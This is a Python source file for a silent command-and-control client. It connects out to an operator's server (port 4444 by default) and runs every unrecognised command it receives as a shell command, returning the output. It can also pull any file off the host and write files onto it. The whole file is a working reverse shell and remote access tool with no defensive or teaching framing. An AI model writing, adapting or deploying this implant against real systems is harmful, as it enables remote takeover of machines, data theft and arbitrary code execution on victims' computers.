import socket
import os
import subprocess
import struct
import sys
import threading

class C2Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((self.host, self.port))
        self.client.settimeout(60.0)
        self.client.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

    def run(self):
        while True:
            try:
                # Wait for commands from server
                data = self.client.recv(4096).decode().strip()
                if not data:
                    break

                # --- Command router ---
                if data.lower() == "ping":
                    self.client.send(b"PONG")

                elif data.upper().startswith("UPLOAD "):
                    # Format: UPLOAD <remote_path>
                    _, remote_path = data.split(" ", 1)
                    self.client.send(b"READY")  # Tell server we're ready
                    # Receive size header
                    size_data = self.client.recv(8)
                    if len(size_data) < 8:
                        continue
                    file_size = struct.unpack('!Q', size_data)[0]
                    # Write file
                    with open(remote_path, 'wb') as f:
                        received = 0
                        while received < file_size:
                            chunk = self.client.recv(min(4096, file_size - received))
                            if not chunk:
                                break
                            f.write(chunk)
                            received += len(chunk)

                elif data.upper().startswith("DOWNLOAD "):
                    # Format: DOWNLOAD <remote_file>
                    _, remote_file = data.split(" ", 1)
                    if not os.path.exists(remote_file) or not os.path.isfile(remote_file):
                        self.client.send(struct.pack('!Q', 0))
                        self.client.send(b"File not found.")
                        continue
                    file_size = os.path.getsize(remote_file)
                    self.client.send(struct.pack('!Q', file_size))
                    with open(remote_file, 'rb') as f:
                        sent = 0
                        while sent < file_size:
                            chunk = f.read(4096)
                            if not chunk:
                                break
                            self.client.send(chunk)
                            sent += len(chunk)

                elif data.lower() == "exit":
                    break

                else:
                    # Default: execute as shell command
                    try:
                        output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
                        self.client.send(output)
                    except Exception as e:
                        self.client.send(str(e).encode())

            except socket.timeout:
                # Send a small heartbeat ping to check if server is still there
                try:
                    self.client.send(b"PING")
                    # Wait for PONG, if none, disconnect
                    resp = self.client.recv(4)
                    if resp != b"PONG":
                        break
                except:
                    break
            except Exception:
                break

        self.client.close()

if __name__ == "__main__":
    # Silent: no prints, no prompts.
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
    client = C2Client(host, port)
    client.run()
